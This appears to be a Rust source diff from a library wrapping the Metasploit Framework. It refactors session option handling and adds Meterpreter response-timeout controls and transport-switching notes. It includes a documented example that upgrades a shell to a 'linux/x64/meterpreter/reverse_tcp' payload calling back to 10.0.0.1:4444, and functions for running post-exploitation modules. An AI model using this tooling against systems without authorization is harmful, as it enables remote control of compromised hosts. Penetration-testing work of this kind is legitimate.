@@ -7,9 +7,9 @@
 use crate::error::{AssassinateError, Result};
 use crate::ruby_bridge::{
     call_bool_with_str, call_method, call_str_with_str, call_strings_with_str, call_void_with_str,
-    get_i64_attr, get_string_attr, responds_to_public, sym, to_ruby_str, value_to_string,
+    get_i64_attr, get_string_attr, responds_to_public, sym, to_ruby_str, value_to_string, Options,
 };
-use magnus::{value::ReprValue, RHash, TryConvert, Value};
+use magnus::{value::ReprValue, IntoValue, RHash, TryConvert, Value};
 
 /// Session manager for listing and accessing sessions
 #[derive(Clone)]
@@ -357,8 +357,8 @@ impl Session {
     /// always using x86 payload. To get x64 Meterpreter on Linux, pass extra_options:
     /// ```ignore
     /// let mut extra_options = std::collections::HashMap::new();
-    /// extra_options.insert("PAYLOAD_OVERRIDE".to_string(), "linux/x64/meterpreter/reverse_tcp".to_string());
-    /// extra_options.insert("PLATFORM_OVERRIDE".to_string(), "linux".to_string());
+    /// extra_options.insert("PAYLOAD_OVERRIDE".into(), "linux/x64/meterpreter/reverse_tcp".into());
+    /// extra_options.insert("PLATFORM_OVERRIDE".into(), "linux".into());
     /// session.shell_to_meterpreter("10.0.0.1", 4444, Some(extra_options));
     /// ```
     /// This is important because x86/linux Meterpreter has limited functionality
@@ -367,14 +367,16 @@ impl Session {
         &self,
         lhost: &str,
         lport: u16,
-        extra_options: Option<std::collections::HashMap<String, String>>,
+        extra_options: Option<Options>,
     ) -> Result<bool> {
+        use crate::ruby_bridge::RubyVal;
+
         // Use run_post_module which properly handles module creation and options
         // HANDLER=true tells the module to start its own handler
-        let mut options = std::collections::HashMap::new();
-        options.insert("LHOST".to_string(), lhost.to_string());
-        options.insert("LPORT".to_string(), lport.to_string());
-        options.insert("HANDLER".to_string(), "true".to_string());
+        let mut options = Options::new();
+        options.insert("LHOST".into(), RubyVal::String(lhost.to_string()));
+        options.insert("LPORT".into(), RubyVal::String(lport.to_string()));
+        options.insert("HANDLER".into(), RubyVal::String("true".to_string()));
 
         // Merge any extra options provided by the caller
         if let Some(extra) = extra_options {
@@ -603,7 +605,7 @@ impl Session {
     pub fn run_post_module(
         &self,
         module_path: &str,
-        options: std::collections::HashMap<String, String>,
+        options: Options,
     ) -> Result<bool> {
         let ruby = crate::ruby_bridge::get_ruby()?;
 
@@ -656,7 +658,7 @@ impl Session {
         // Set additional options
         for (key, value) in options {
             let key_val = ruby.str_new(&key).as_value();
-            let value_val = ruby.str_new(&value).as_value();
+            let value_val = value.into_value_with(&ruby);
             call_method(datastore, "[]=", &[key_val, value_val])?;
         }
 
@@ -1560,10 +1562,33 @@ impl Session {
         Ok(result.to_bool())
     }
 
+    /// Set the response timeout for Meterpreter commands (in seconds)
+    ///
+    /// This controls how long send_request waits for a response.
+    /// Useful for transport switching which may timeout when switching handlers.
+    pub fn set_response_timeout(&self, timeout_secs: u32) -> Result<()> {
+        let ruby = crate::ruby_bridge::get_ruby()?;
+        let timeout_val = ruby.integer_from_u64(timeout_secs as u64).as_value();
+        call_method(self.ruby_session, "response_timeout=", &[timeout_val])?;
+        Ok(())
+    }
+
+    /// Get the current response timeout for Meterpreter commands (in seconds)
+    pub fn get_response_timeout(&self) -> Result<u32> {
+        let result = call_method(self.ruby_session, "response_timeout", &[])?;
+        let timeout: i64 = TryConvert::try_convert(result)
+            .map_err(|e: magnus::Error| AssassinateError::ConversionError(e.to_string()))?;
+        Ok(timeout as u32)
+    }
+
     /// Switch to the next transport in the transport list
     ///
     /// This cycles to the next configured transport.
     /// Only works on Meterpreter sessions.
+    ///
+    /// Note: If switching to a different working handler, this will timeout
+    /// because the response comes on the new handler, not the old one.
+    /// Use set_response_timeout() to set a short timeout before calling.
     pub fn transport_next(&self) -> Result<bool> {
         let result = call_method(self.core()?, "transport_next", &[])?;
         Ok(result.to_bool())
@@ -1573,6 +1598,10 @@ impl Session {
     ///
     /// This cycles to the previous configured transport.
     /// Only works on Meterpreter sessions.
+    ///
+    /// Note: If switching to a different working handler, this will timeout
+    /// because the response comes on the new handler, not the old one.
+    /// Use set_response_timeout() to set a short timeout before calling.
     pub fn transport_prev(&self) -> Result<bool> {
         let result = call_method(self.core()?, "transport_prev", &[])?;
         Ok(result.to_bool())
